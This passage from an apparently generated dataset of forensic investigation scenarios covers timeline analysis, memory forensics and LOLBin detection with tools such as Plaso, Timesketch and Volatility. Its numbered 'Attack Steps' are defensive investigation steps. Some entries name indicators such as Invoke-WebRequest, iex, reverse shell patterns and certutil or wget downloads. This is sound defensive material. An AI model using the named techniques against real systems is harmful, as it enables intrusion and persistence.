- **Solution**: Restrict user ability to create services
- **Tags**: service install, 7045, backdoor, persistence

## Timeline Reconstruction of Phishing Email Execution

- **Attack Type**: Initial Access
- **Target**: Email Client
- **Vulnerability**: No email scanning or sandboxing
- **MITRE**: T1566.001
- **Impact**: Initial access to internal system
- **Tools**: Email Header, Prefetch, Event Logs
- **Scenario**: Traces execution path of phishing attachment from email to code execution
- **Attack Steps**: 1. Collect and parse email with malicious attachment. 2. Extract timestamp and recipient metadata. 3. Use Plaso to extract Prefetch and file metadata for attachment. 4. Track file download, open, and execution timestamps. 5. Correlate Event Logs for process launch (4688) post-email open. 6. Identify spawned child processes (e.g., cmd, powershell). 7. Check registry changes or dropped files immediately after. 8. Map the execution sequence visually using timeline tools. 9. Document user, email, payload path, and impact.
- **Detection**: Email open → file execute correlation
- **Solution**: Use email sandbox + macro detection
- **Tags**: phishing, doc, timeline, prefetch

## Scheduled Task-Based Persistence Detected in Timeline

- **Attack Type**: Persistence Mechanism
- **Target**: Endpoint
- **Vulnerability**: Unmonitored scheduler config
- **MITRE**: T1053.005
- **Impact**: Persistent execution vector
- **Tools**: Plaso, Task Scheduler Logs
- **Scenario**: Reveals attacker creation of scheduled task to re-execute payload
- **Attack Steps**: 1. Collect Windows Task Scheduler logs from Microsoft-Windows-TaskScheduler/Operational. 2. Use Plaso to parse and identify new task creation events. 3. Look for suspicious task names or binary paths. 4. Align creation time with attacker file drops or execution. 5. Verify trigger type (on logon, on idle, etc.) and frequency. 6. Correlate with file modification or execution timestamps. 7. Document task settings, binary path, and user context. 8. Disable task and preserve evidence for analysis. 9. Add indicators to monitoring rules and schedule cleanup.
- **Detection**: Task creation time + binary execution
- **Solution**: Audit task creation and enforce controls
- **Tags**: task scheduler, t1053, persistence

## Timeline Correlation of Prefetch and $MFT

- **Attack Type**: Forensic Timeline Reconstruction
- **Target**: Workstation
- **Vulnerability**: No patching/tamper detection
- **MITRE**: T1005
- **Impact**: Evidence of execution
- **Tools**: Plaso, Timesketch, FTK Imager
- **Scenario**: Analyst needs to validate if a malicious executable was run by comparing Prefetch execution time and $MFT metadata.
- **Attack Steps**: 1. Acquire disk image using FTK Imager.2. Mount the image and extract Prefetch folder and $MFT.3. Run Plaso to generate a timeline including Prefetch execution timestamps and $MFT timestamps (creation, modification).4. Load timeline into Timesketch.5. Search for suspicious executables in Prefetch.6. Correlate their last run time with $MFT timestamps to confirm execution.7. Check if the timestamps suggest tampering (e.g., MFT shows earlier creation time).8. Tag suspicious activity.9. Generate report for further malware analysis.
- **Detection**: Timeline anomaly detection
- **Solution**: Cross-verification using multiple artifacts
- **Tags**: timeline, mft, prefetch, correlation

## Event Log Burst Timeline Analysis

- **Attack Type**: Anomaly Detection
- **Target**: Server
- **Vulnerability**: Weak log review process
- **MITRE**: T1078
- **Impact**: Account compromise
- **Tools**: Plaso, Windows Event Logs, Timesketch
- **Scenario**: Sudden burst of Event IDs associated with user creation and group changes on a server detected late at night.
- **Attack Steps**: 1. Collect Windows Event Logs from the target system.2. Process them using Plaso to generate a timeline.3. Import the timeline into Timesketch.4. Filter events by time range (e.g., 2AM–4AM) and by Event IDs like 4720 (user creation), 4728 (group added), etc.5. Detect sudden spikes within small time windows.6. Group these into clusters showing suspicious activity.7. Link Event Log anomalies to file system events or login records.8. Tag the timeframe for further triage.9. Alert SOC for potential insider threat or script-driven attack.
- **Detection**: Event clustering in timeline
- **Solution**: Regular audit baselines
- **Tags**: eventlog, anomaly, burst

## Reconstructing Ransomware Behavior via Timeline

- **Attack Type**: File System Timeline Analysis
- **Target**: Endpoint
- **Vulnerability**: Lack of EDR visibility
- **MITRE**: T1486
- **Impact**: Data encryption
- **Tools**: Plaso, Timesketch, Autopsy
- **Scenario**: Analysts try to understand the encryption sequence and impact from a ransomware event.
- **Attack Steps**: 1. Acquire disk image from the affected host.2. Run Plaso to parse NTFS timestamps, $LogFile, and MFT data.3. Import into Timesketch to visualize file access and modification timeline.4. Identify mass file modifications (.docx, .xls, .pdf) within a short span.5. Look for creation of ransom notes (.txt or .html) afterward.6. Observe spikes in CPU/IO timestamps during encryption phase.7. Find any executable prefetch or registry entries shortly before encryption.8. Map complete encryption sequence and correlate with known ransomware IOCs.9. Document sequence to improve IR response.
- **Detection**: Spike detection in IO activity
- **Solution**: Harden with EDR and backups
- **Tags**: ransomware, timeline, encryption

## Timeline Gaps via $LogFile and MFT

- **Attack Type**: Anti-Forensics Detection
- **Target**: Workstation
- **Vulnerability**: Incomplete audit logs
- **MITRE**: T1070.006
- **Impact**: Evidence deletion
- **Tools**: Plaso, MFTECmd, $LogFile parser
- **Scenario**: Adversary tried to delete evidence and manipulate timestamps, leading to gaps in file system logs.
- **Attack Steps**: 1. Extract $MFT and $LogFile from a disk image.2. Use MFTECmd and $LogFile parser to extract granular timestamps.3. Feed into Plaso for super timeline generation.4. Import into Timesketch.5. Identify periods of time with no file activity where there should be activity.6. Cross-check with known user behavior and business hours.7. Mark gaps as potential time-stomping or anti-forensic activity.8. Use USN Journal if available for deeper insight.9. Report findings and flag suspicious time ranges.
- **Detection**: Timeline gap analysis
- **Solution**: Artifact cross-correlation
- **Tags**: log manipulation, timestomping, $logfile

## Detecting USB Exfiltration via Timeline

- **Attack Type**: File Activity Timeline
- **Target**: Workstation
- **Vulnerability**: Lack of USB DLP
- **MITRE**: T1052.001
- **Impact**: Data theft
- **Tools**: Plaso, USBDeviceForensics, Timesketch
- **Scenario**: Suspicious data exfiltration suspected via USB drive during off-hours.
- **Attack Steps**: 1. Acquire disk and registry hive image from suspected host.2. Extract SYSTEM, SOFTWARE hives to identify USB device installation.3. Parse timeline with Plaso to include file copy operations and USB registry activity.4. In Timesketch, filter by volume serial or mount points.5. Match timestamps where files were accessed and copied.6. Detect pattern of large file accesses shortly after USB insert.7. Include shellbags or LNK files to strengthen evidence.8. Tag suspect time range and export session.9. Document exfil pattern and affected files.
- **Detection**: Volume serial + file activity correlation
- **Solution**: USB activity monitoring
- **Tags**: usb, exfiltration, file timeline

## Timeline Correlation with Prefetch and SRUM

- **Attack Type**: Execution Evidence Timeline
- **Target**: Workstation
- **Vulnerability**: No EDR logging
- **MITRE**: T1003.001
- **Impact**: Credential theft prep
- **Tools**: Plaso, Nirsoft tools, SRUM dump, Timesketch
- **Scenario**: Analyst wants to confirm if a tool was repeatedly used before breach.
- **Attack Steps**: 1. Extract Prefetch folder and SRUM database from target.2. Run Plaso to create timeline with Prefetch + SRUM.3. Export SRUM usage data using Nirsoft tools.4. Align SRUM data with timeline in Timesketch.5. Search for tool usage (e.g., mimikatz.exe) across both sources.6. Compare runtime durations and energy consumption patterns.7. Detect recurring execution prior to breach.8. Link this tool's usage with timeline of privilege escalation.9. Build behavioral profile of the attacker.
- **Detection**: Cross-referencing SRUM & Prefetch
- **Solution**: EDR + PowerShell logs
- **Tags**: srum, prefetch, execution timeline

## KAPE Timeline Explorer for Lateral Movement

- **Attack Type**: Artifact Triage Timeline
- **Target**: Server
- **Vulnerability**: No login alerts
- **MITRE**: T1021.002
- **Impact**: Network pivoting
- **Tools**: KAPE, EZ Tools, Timeline Explorer
- **Scenario**: Analyst uses KAPE to quickly review lateral movement artifacts.
- **Attack Steps**: 1. Run KAPE Triage with modules for event logs, SRUM, registry.2. Load outputs into Timeline Explorer.3. Sort by Event IDs for remote logon (4624 Type 10), service creation, and scheduled tasks.4. Trace series of events showing pivoting behavior.5. Find suspicious logins followed by service drops.6. Link lateral movement time with malware execution or script drops.7. Flag activity outside user’s working hours.8. Export filtered timeline for SOC correlation.9. Initiate isolation of affected systems.
- **Detection**: Timeline Explorer filtering
- **Solution**: Centralized event logging
- **Tags**: kape, lateral movement, logon

## Timeline Analysis of Scheduled Tasks

- **Attack Type**: Execution Persistence Timeline
- **Target**: Workstation
- **Vulnerability**: Misconfigured task scheduler
- **MITRE**: T1053.005
- **Impact**: Persistence via scheduled tasks
- **Tools**: Plaso, Timesketch, Windows Task Scheduler
- **Scenario**: Suspicious persistence method using scheduled tasks.
- **Attack Steps**: 1. Pull SYSTEM and SOFTWARE hives along with TaskScheduler logs.2. Use Plaso to parse scheduled task creation events and script triggers.3. Load into Timesketch for visualization.4. Filter events with "schtasks.exe", "taskschd.msc", or Event ID 106.5. Note task creation times and correlate with login sessions.6. Check for scripts or binaries referenced in task.7. Compare creation time with known breach indicators.8. Tag suspicious entries and link with persistence timeline.9. Report and suggest cleanup of malicious tasks.
- **Detection**: Task creation monitoring
- **Solution**: GPO hardening & task audit
- **Tags**: scheduledtask, persistence, timeline

## Multi-User Timeline Reconstruction

- **Attack Type**: User Activity Correlation
- **Target**: Shared Terminal
- **Vulnerability**: Weak user auditing
- **MITRE**: T1078
- **Impact**: Credential misuse
- **Tools**: Plaso, Timesketch, LogonTracer
- **Scenario**: Analyst must reconstruct attacker vs normal user activity on a shared system.
- **Attack Steps**: 1. Process disk and log data with Plaso.2. Import into Timesketch and extract all user-based activities.3. Correlate with login sessions (Event ID 4624) per user.4. Filter shellbag, prefetch, and registry events by user SID.5. Identify which user initiated suspicious commands.6. Cross-reference with LogonTracer for session correlation.7. Separate benign user behavior from attacker sessions.8. Tag malicious user actions (e.g., malware install, lateral movement).9. Compile per-user timeline for case reporting.
- **Detection**: Per-user timeline dissection
- **Solution**: Strong user audit + MFA
- **Tags**: user activity, SID, timeline

## Timeline Analysis of Log Deletion Attempts

- **Attack Type**: Anti-Forensics Detection
- **Target**: Workstation
- **Vulnerability**: No log tamper alerts
- **MITRE**: T1070.001
- **Impact**: Log tampering
- **Tools**: Plaso, Timesketch, Security Log Parser
- **Scenario**: Detecting attempts to delete or overwrite system logs.
- **Attack Steps**: 1. Collect event logs and $LogFile from affected system.2. Use Plaso to generate timeline of log-related events.3. Search for Event IDs like 1102 (audit log cleared), 517 (security log cleared).4. Correlate these with admin logins or unknown users.5. Detect deletion shortly after critical events.6. Cross-check if deleted logs match gap in Event Timeline.7. Review timestamps in Timesketch for clustering or anomalies.8. Identify tools like wevtutil.exe used suspiciously.9. Tag time range for further disk-level recovery of logs.
- **Detection**: Event ID correlation
- **Solution**: Immutable logging setup
- **Tags**: log deletion, anti-forensics

## Timeline Analysis of Registry Run Keys

- **Attack Type**: Persistence Analysis
- **Target**: Endpoint
- **Vulnerability**: Registry misuse
- **MITRE**: T1547.001
- **Impact**: Persistence via autorun
- **Tools**: Plaso, RegRipper, Timesketch
- **Scenario**: Detecting malicious programs that auto-start via registry keys.
- **Attack Steps**: 1. Acquire registry hives (NTUSER.DAT, SOFTWARE) from system image.2. Use Plaso to include registry timestamps in super timeline.3. Run RegRipper to extract Run/RunOnce keys.4. Import data into Timesketch.5. Identify executables in Run keys and analyze their paths.6. Compare timestamp of key creation with known breach window.7. Check for unusual program names or locations (e.g., Temp, AppData).8. Tag suspicious keys and investigate associated executables.9. Document persistence method for remediation.
- **Detection**: Timeline and path inspection
- **Solution**: Registry key monitoring
- **Tags**: registry, autorun, timeline

## Correlating Prefetch, $MFT, and Event Logs

- **Attack Type**: Multi-Artifact Correlation
- **Target**: Workstation
- **Vulnerability**: Artifact silos
- **MITRE**: T1059
- **Impact**: Script execution confirmed
- **Tools**: Plaso, Timesketch, Event Log Viewer
- **Scenario**: Rebuilding execution history using multiple artifact sources.
- **Attack Steps**: 1. Acquire disk image and event logs from the system.2. Extract Prefetch, $MFT, and Event Logs.3. Parse using Plaso to include all sources in one timeline.4. In Timesketch, find the timestamp when a suspicious binary first appeared in $MFT.5. Confirm execution via Prefetch 'Last Run Time'.6. Correlate this with Event ID 4688 (process creation).7. Detect matching sequence across all sources.8. Use this to validate execution and detect persistence attempts.9. Document attack chain in timeline report.
- **Detection**: Cross-source timestamp match
- **Solution**: Use multiple forensic sources
- **Tags**: timeline, correlation, prefetch

## Detecting Night-Time Admin Logins

- **Attack Type**: Anomaly Detection
- **Target**: Server
- **Vulnerability**: No working hours policy
- **MITRE**: T1078
- **Impact**: Account misuse
- **Tools**: Plaso, Timesketch, LogonTracer
- **Scenario**: Suspicious administrative logins happened outside business hours.
- **Attack Steps**: 1. Collect Windows Event Logs and parse with Plaso.2. In Timesketch, filter by Event ID 4624 (Logon), Type 2/10 (interactive/remote).3. Filter logins occurring between 12 AM and 6 AM.4. Check the user accounts involved (admins, domain users).5. Correlate with command execution or service creation events.6. Investigate if login source was internal or external.7. Mark the time range as suspicious for SOC review.8. Generate timeline visualization for pattern detection.9. Initiate IR playbook for suspicious account activity.
- **Detection**: Night-time login flagging
- **Solution**: Login alerts and baseline
- **Tags**: login, anomaly, admin

## Plaso + LNK Files for Execution Tracking

- **Attack Type**: File Execution Analysis
- **Target**: Endpoint
- **Vulnerability**: No shortcut audit
- **MITRE**: T1204.002
- **Impact**: User-executed malware
- **Tools**: Plaso, Timesketch, LECmd
- **Scenario**: Tracking program usage via Windows shortcut (.lnk) files.
- **Attack Steps**: 1. Extract user directories from disk image (e.g., Desktop, Recent, etc.).2. Use Plaso to generate timeline including .lnk metadata.3. Run LECmd to analyze shortcut targets and access times.4. In Timesketch, filter for creation and access times of suspicious LNKs.5. Cross-reference these with file modification and execution times.6. Confirm if user launched malicious executables manually.7. Compare timestamps with login sessions and USB insertions.8. Tag findings for chain of custody.9. Use results in legal evidence reporting.
- **Detection**: LNK access and creation analysis
- **Solution**: LNK audit and folder control
- **Tags**: lnk, execution, shortcut

## File Copy & Rename Detection in Timeline

- **Attack Type**: Anti-Forensics Detection
- **Target**: Workstation
- **Vulnerability**: Name masquerading
- **MITRE**: T1036.003
- **Impact**: Evasion via name tampering
- **Tools**: Plaso, Timesketch, $MFT, File System Logs
- **Scenario**: Adversary copied tools to blend in by renaming known file names.
- **Attack Steps**: 1. Create super timeline with Plaso including $MFT and $LogFile.2. In Timesketch, search for suspicious executables with recently modified names (e.g., svchost.exe in wrong directory).3. Compare file creation and rename timestamps closely.4. Trace source directory and original name if logs allow.5. Check for execution shortly after rename.6. Detect pattern of masquerading or evasion.7. Tag and report rename events to IR team.8. Use hashes to check against malware databases.9. Recommend whitelist enforcement.
- **Detection**: Rename timestamp analysis
- **Solution**: Application whitelisting
- **Tags**: rename, evasion, mft

## Timeline of Browser-Based Phishing Execution

- **Attack Type**: Initial Access Forensics
- **Target**: Workstation
- **Vulnerability**: Lack of phishing block
- **MITRE**: T1566.002
- **Impact**: User-based initial access
- **Tools**: Plaso, Browsing History Viewer, Timesketch
- **Scenario**: Determine exact time user clicked a phishing link and payload executed.
- **Attack Steps**: 1. Extract browser history files (Chrome, Edge) from user profile.2. Parse them using Plaso and integrate into a full system timeline.3. Locate access time of known phishing domain or suspicious redirect.4. Check for immediate download events, including .exe or .zip files.5. Correlate file creation from $MFT with browsing event.6. Look for Prefetch data of downloaded file being executed.7. Determine user session during event.8. Tag and extract relevant timestamps for report.9. Use results for user awareness and IOC development.
- **Detection**: Timeline of click to execution
- **Solution**: DNS + browser filtering
- **Tags**: phishing, browser, user

## Sequence Reconstruction of Dropper and Payload

- **Attack Type**: Attack Chain Reconstruction
- **Target**: Server
- **Vulnerability**: No stage detection
- **MITRE**: T1204 → T1059 → T1486
- **Impact**: Full infection chain
- **Tools**: Plaso, Timesketch, Prefetch, Event Logs
- **Scenario**: Timeline shows dropper execution followed by staged malware payload.
- **Attack Steps**: 1. Use Plaso to include Prefetch, $MFT, Event Logs in a full timeline.2. Locate first execution of dropper.exe via Prefetch.3. Track file creation and modification shortly after — likely the payload.4. Check event logs for any service or scheduled task creation.5. Correlate timestamps to determine full attacker sequence.6. Identify final payload's execution and data exfil indicators.7. Tag each stage for clarity (dropper, loader, payload).8. Export annotated timeline.9. Use findings for breach reporting and future detection rules.
- **Detection**: Timeline annotation of stages
- **Solution**: Detection rule tuning
- **Tags**: dropper, staged, attackchain

## Identifying Dormant Persistence via Timeline

- **Attack Type**: Stealth Persistence Detection
- **Target**: Endpoint
- **Vulnerability**: Long dwell time undetected
- **MITRE**: T1053.005
- **Impact**: Stealthy scheduled tasks
- **Tools**: Plaso, Task Scheduler logs, Registry Timeline
- **Scenario**: Persistence mechanism activates weeks after implantation.
- **Attack Steps**: 1. Use Plaso to create extended timeline across weeks.2. Look for registry entries or tasks created long before activation.3. Search for command or script triggered after long dormancy.4. Compare scheduled run date with creation date.5. Detect anomalous delay in task execution.6. Tag artifact as stealth persistence.7. Search similar indicators across environment.8. Report mechanism to engineering and detection teams.9. Recommend recurring audit of dormant configs.
- **Detection**: Time delta between creation and exec
- **Solution**: Audit long-standing artifacts
- **Tags**: dormant, persistence, timeline

## Analyzing Data Staging Before Exfiltration

- **Attack Type**: Pre-Exfiltration Timeline
- **Target**: Server
- **Vulnerability**: No exfil staging alerting
- **MITRE**: T1074
- **Impact**: Insider data staging
- **Tools**: Plaso, Timesketch, File System Timeline
- **Scenario**: Large file copies occurred before suspected external data exfiltration.
- **Attack Steps**: 1. Run Plaso on disk image to capture file modification and access events.2. Identify creation of large .zip, .rar, or .7z files in unusual locations.3. Match timestamps to spike in read operations or file renames.4. Correlate with outbound connection logs, if available.5. Check if files were later deleted or transferred to mounted volume.6. Use timeline to prove staging before transmission.7. Flag activities for insider threat investigation.8. Recommend implementation of staging detection alerts.9. Document case for legal follow-up.
- **Detection**: Large archive + network correlation
- **Solution**: Staging behavior detection
- **Tags**: staging, exfil, insider

## Super Timeline Pivot Around Initial Compromise

- **Attack Type**: Incident Root Cause Tracing
- **Target**: Any
- **Vulnerability**: No early detection
- **MITRE**: T1059, T1078, T1021
- **Impact**: End-to-end breach understanding
- **Tools**: Plaso, Timesketch
- **Scenario**: Analysts use super timeline to pivot around first compromise indicator.
- **Attack Steps**: 1. Create full super timeline using Plaso from disk image and logs.2. In Timesketch, locate known IOC (e.g., malicious file or Event ID).3. Expand timeline ±30 minutes to see nearby events.4. Identify actions before and after IOC — process creations, registry changes, etc.5. Determine how compromise happened (e.g., macro run, USB insertion).6. Pivot outward to lateral movement or data access events.7. Build full narrative of attacker behavior.8. Tag timeline sections per phase (initial, lateral, exfil).9. Use this for report, threat hunt, and root cause documentation.
- **Detection**: IOC-centered timeline pivoting
- **Solution**: IOC-based detection workflows
- **Tags**: rootcause, pivot, IOC

## Detect Suspicious Process Chain: WINWORD to PowerShell

- **Attack Type**: Process & Command Line Analysis
- **Target**: Workstation
- **Vulnerability**: Phishing Doc
- **MITRE**: T1059.001
- **Impact**: Initial Access via Office Macro
- **Tools**: Volatility, Process Hacker
- **Scenario**: An attacker sends a phishing email with a malicious Word document that launches PowerShell for C2.
- **Attack Steps**: 1. Acquire memory image of the system.2. Load memory into Volatility and list running processes (pslist).3. Locate WINWORD.EXE and inspect its child processes using pstree.4. Notice powershell.exe spawned as a child — an anomaly.5. Use cmdline plugin to examine command-line arguments of powershell.exe.6. Decode any Base64 payload passed to PowerShell.7. Cross-reference process creation time and user SID.8. Verify integrity of PowerShell path.9. Export process memory for offline analysis.10. Alert SOC for further triage.
- **Detection**: Event ID 4688, Volatility pstree, Command-line logging
- **Solution**: Disable macros, train users, apply ASR rules
- **Tags**: phishing, powershell, volatility, dfir

## Detect Process Hollowing of svchost.exe

- **Attack Type**: Process & Command Line Analysis
- **Target**: Endpoint
- **Vulnerability**: Code Injection
- **MITRE**: T1055.012
- **Impact**: Malware Evasion
- **Tools**: Volatility, Process Hacker, PE-sieve
- **Scenario**: A threat actor uses process hollowing to hide malware in a legitimate svchost.exe instance.
- **Attack Steps**: 1. Capture RAM image using FTK Imager or DumpIt.2. Use Volatility's malfind to identify injected code in memory.3. Focus on svchost.exe processes running in abnormal locations.4. Extract hollowed PE sections using procdump or dlldump.5. Scan memory using PE-sieve to detect overwritten entry points.6. Compare memory image to known-good svchost hash.7. Identify mismatched parent-child relationship.8. Detect lack of command-line arguments for svchost (an anomaly).9. Confirm payload with VirusTotal or hybrid analysis.10. Document IOC and update detection rule sets.
- **Detection**: Memory diff, hash mismatch, malfind
- **Solution**: Block untrusted execution, monitor code injection
- **Tags**: process hollowing, memory analysis, volatility

## Command Line Analysis of Obfuscated Base64 Payload

- **Attack Type**: Process & Command Line Analysis
- **Target**: Workstation
- **Vulnerability**: Obfuscated Scripting
- **MITRE**: T1059.001
- **Impact**: Command & Control Setup
- **Tools**: Event Logs, PowerShell Logs, CyberChef
- **Scenario**: Attacker uses heavily obfuscated PowerShell encoded commands to download and execute payload.
- **Attack Steps**: 1. Enable PowerShell ScriptBlock Logging and log collection.2. Filter Event ID 4104 in Windows Event Logs.3. Extract suspicious Base64-encoded strings from command lines.4. Decode using CyberChef and identify hidden commands.5. Spot indicators such as Invoke-WebRequest, iex, or reverse shell patterns.6. Correlate with Event ID 4688 for process execution.7. Trace back to originating process (e.g., Excel or Word).8. Review network logs for outbound connections initiated.9. Capture dropped files using Sysmon FileCreate.10. Create detection rules based on decoded patterns.
- **Detection**: PowerShell logs, 4688, Sysmon
- **Solution**: Encode-aware detection, log monitoring
- **Tags**: powershell, base64, encoded, evtx

## Detect WMIC Abuse for Persistence

- **Attack Type**: Process & Command Line Analysis
- **Target**: Windows Host
- **Vulnerability**: Living Off the Land
- **MITRE**: T1047
- **Impact**: Persistence
- **Tools**: Autoruns, Event Logs, WMI Explorer
- **Scenario**: WMIC is used to execute a remote payload silently on reboot using a custom consumer.
- **Attack Steps**: 1. Use Autoruns to inspect WMI persistence entries.2. Identify any suspicious event filter and consumer pairings.3. Open WMI Explorer and navigate to root\subscription namespace.4. Look for CommandLineEventConsumer instances with encoded commands.5. Extract and decode the command.6. Verify event filters triggering on system boot or logon.7. Correlate timestamps with user activity.8. Trace creation back to original attacker process.9. Check for Event ID 5861 (WMI consumer creation).10. Remove malicious WMI entry and document for case notes.
- **Detection**: WMI logs, Autoruns, Registry
- **Solution**: Remove consumer, alert on abnormal WMI
- **Tags**: wmic, lolbins, persistence, wmi abuse

## Detect Regsvr32 Execution from Suspicious Path

- **Attack Type**: Process & Command Line Analysis
- **Target**: Server or Desktop
- **Vulnerability**: LOLBin Abuse
- **MITRE**: T1218.010
- **Impact**: Execution & Bypass AV
- **Tools**: Sysmon, Event Viewer
- **Scenario**: Attacker executes malicious DLL using regsvr32 from an unusual directory.
- **Attack Steps**: 1. Configure Sysmon to log ImageLoad and ProcessCreate.2. Search for regsvr32.exe executions outside C:\Windows\System32.3. Analyze command-line arguments — look for remote .sct or DLL files.4. Check file path and hash for known malware signatures.5. Use file properties to confirm digital signature absence.6. Review process tree to find parent (should not be Word or Explorer).7. Track network activity initiated after execution.8. Search registry for associated persistence keys.9. Check Event ID 7045 for recent service installs.10. Block the file hash and update detection rules.
- **Detection**: Sysmon ID 1, 7, 11; Event ID 7045
- **Solution**: Restrict regsvr32 use, monitor via EDR
- **Tags**: lolbins, regsvr32, dll execution

## Prefetch Analysis for Suspicious Binaries

- **Attack Type**: Process & Command Line Analysis
- **Target**: Workstation
- **Vulnerability**: Post-Exploitation
- **MITRE**: T1003.001
- **Impact**: Credential Theft
- **Tools**: PECmd, Windows Explorer, KAPE
- **Scenario**: Use prefetch data to detect rare or first-time binary execution like mimikatz.exe.
- **Attack Steps**: 1. Collect prefetch files from C:\Windows\Prefetch.2. Use PECmd or KAPE to parse .pf files.3. Sort executables by run count and last execution time.4. Identify uncommon or suspicious executables like mimikatz.exe.5. Correlate with creation date and file path.6. Extract run history including associated files.7. Review user account under which it was run.8. Check for same binary across systems (lateral movement).9. Export evidence for offline triage.10. Report IOC and trigger hunting query.
- **Detection**: Prefetch timestamps and run count
- **Solution**: Prefetch alerting, application whitelisting
- **Tags**: prefetch, execution trace, dfir

## Detect Abnormal PowerShell Execution via WMI

- **Attack Type**: Process & Command Line Analysis
- **Target**: Workstation
- **Vulnerability**: Living Off the Land
- **MITRE**: T1047 + T1059
- **Impact**: Stealthy Execution
- **Tools**: Sysmon, PowerShell Logs
- **Scenario**: PowerShell is launched through WMI without user interaction.
- **Attack Steps**: 1. Review Sysmon logs for WMI command executions (Event ID 1).2. Filter for PowerShell launched by wmiprvse.exe.3. Extract and decode command-line parameters.4. Review timing and user context (was user active?).5. Cross-reference with login sessions.6. Identify unusual PowerShell usage patterns (e.g., download cradle).7. Inspect registry for associated WMI persistence.8. Block C2 domains and URLs if found.9. Check parent process lineage.10. Report to IR team for follow-up.
- **Detection**: WMI + PowerShell logs
- **Solution**: Disable WMI exec remotely, alert on combos
- **Tags**: wmi, powershell, stealth, c2

## Process Tree Analysis: mshta.exe as Dropper

- **Attack Type**: Process & Command Line Analysis
- **Target**: Endpoint
- **Vulnerability**: Dropper Execution
- **MITRE**: T1218.005
- **Impact**: Initial Infection
- **Tools**: Process Hacker, Volatility
- **Scenario**: Malicious .hta file dropped via phishing launches malware using mshta.exe.
- **Attack Steps**: 1. Inspect process tree in memory using pstree in Volatility.2. Identify mshta.exe running as child of Outlook or browser.3. Check command line for URL-based .hta payload.4. Trace network connection made by the payload.5. Review browser history and attachments.6. Dump memory region used by mshta.exe.7. Analyze downloaded files with AV scanner.8. Alert if mshta.exe is run with internet URL.9. Correlate with proxy logs.10. Block mshta.exe for standard users.
- **Detection**: pstree, mshta.exe CLI, AV scan
- **Solution**: Disable mshta, log command-line use
- **Tags**: phishing, hta, dropper

## Detect Suspicious rundll32 Usage

- **Attack Type**: Process & Command Line Analysis
- **Target**: Workstation
- **Vulnerability**: LOLBin Abuse
- **MITRE**: T1218.011
- **Impact**: Code Execution
- **Tools**: Sysmon, Event Logs
- **Scenario**: rundll32.exe is used to execute shellcode or payloads from unusual locations.
- **Attack Steps**: 1. Monitor process executions of rundll32.exe.2. Flag those launching unknown or non-system DLLs.3. Extract DLL path from command-line argument.4. Hash DLL and scan in malware database.5. Analyze process ancestry (who spawned it?).6. Detect fileless payloads embedded in memory.7. Inspect network activity post-execution.8. Use Event ID 4688 for correlation.9. Alert on rare usage of rundll32.10. Blacklist suspicious DLL.
- **Detection**: rundll32 logs, command line
- **Solution**: Restrict rundll32 and audit use
- **Tags**: lolbin, dll, execution

## Catch Parent-Child Anomaly: Excel to CMD to PowerShell

- **Attack Type**: Process & Command Line Analysis
- **Target**: Workstation
- **Vulnerability**: Macro Abuse
- **MITRE**: T1059.003
- **Impact**: C2 or Payload Drop
- **Tools**: Process Explorer, Event Viewer
- **Scenario**: Malicious macro in Excel spawns a CMD process that then calls PowerShell.
- **Attack Steps**: 1. Enable parent-child process tracking (Sysmon/Event ID 4688).2. Observe process tree starting with excel.exe spawning cmd.exe.3. cmd.exe then launches powershell.exe — suspicious chain.4. Extract full command-line used in PowerShell.5. Decode any hidden payloads or URLs.6. Cross-check creation timestamps.7. Identify user who executed macro.8. Inspect Excel document for embedded macro.9. Quarantine affected files.10. Notify SOC and update detection rule.
- **Detection**: Process lineage, command line
- **Solution**: Disable macros, alert on chain
- **Tags**: macro, cmd, powershell chain

## Detecting Suspicious PowerShell Spawns from Office Apps

- **Attack Type**: Command Line Analysis
- **Target**: Workstation
- **Vulnerability**: Macro-enabled payloads
- **MITRE**: T1059.001
- **Impact**: Remote code execution
- **Tools**: Event Viewer, Sysmon, KAPE
- **Scenario**: Attackers use Office macros to spawn PowerShell for payload delivery
- **Attack Steps**: 1. Open Event Viewer and navigate to Windows Logs → Security or Applications and Services Logs → Microsoft → Windows → Sysmon → Operational. 2. Search for Event ID 1 (process creation) and look for "powershell.exe". 3. Cross-check the parent process field — if it's "winword.exe", "excel.exe", or similar Office apps, it's suspicious. 4. Check the command line parameters to see if it's obfuscated (e.g., Base64 encoded strings). 5. Use KAPE with modules targeting command line artifacts to collect relevant logs and command execution trails. 6. Identify any follow-up processes spawned by PowerShell (e.g., wget, certutil, rundll32). 7. Cross-reference prefetch files for frequency and timestamp correlation. 8. Record parent-child process chains. 9. Tag the event as potential Office Macro-based execution. 10. Generate a visual chain in Timeline tool for investigation.
- **Detection**: Command line logging, parent-child process mapping
- **Solution**: Disable Office macros, restrict PowerShell usage
- **Tags**: PowerShell, Office Macros, TTPs, Process Analysis

## Identifying Process Hollowing via Memory Analysis

- **Attack Type**: Process Inspection
- **Target**: Workstation/Server
- **Vulnerability**: Process hollowing technique
- **MITRE**: T1055.012
- **Impact**: Evasion, malware persistence
- **Tools**: Volatility, Process Hacker
- **Scenario**: Attackers inject malicious code into legitimate processes to avoid detection
- **Attack Steps**: 1. Acquire a memory dump using tools like DumpIt. 2. Load the dump in Volatility. 3. Use pslist, pstree, and psscan to list running processes. 4. Use malfind to detect injected memory regions inside common processes (like svchost.exe or explorer.exe). 5. Examine cmdline and dlllist output to compare expected modules vs injected payloads. 6. Use Process Hacker to live inspect the process on a similar live system (if applicable) for injected threads or mapped memory regions. 7. Analyze memory regions with suspicious protections (RWX). 8. Dump the injected section and scan with AV or reverse engineer. 9. Correlate process start times with any suspicious command line executions or scheduled tasks. 10. Confirm process hollowing and document indicators of compromise (IOCs).
- **Detection**: Memory inspection, process structure anomaly detection
- **Solution**: Enable memory dump collection, endpoint detection tools
- **Tags**: Process Injection, Memory Analysis, Evasion

## Tracking WMI-based Persistence

- **Attack Type**: Command Line & WMI Analysis
- **Target**: Workstation
- **Vulnerability**: WMI persistence abuse
- **MITRE**: T1084
- **Impact**: Long-term stealthy access
- **Tools**: Event Viewer, WMI Explorer, Autoruns
- **Scenario**: Adversaries persist through WMI event subscriptions and consumers
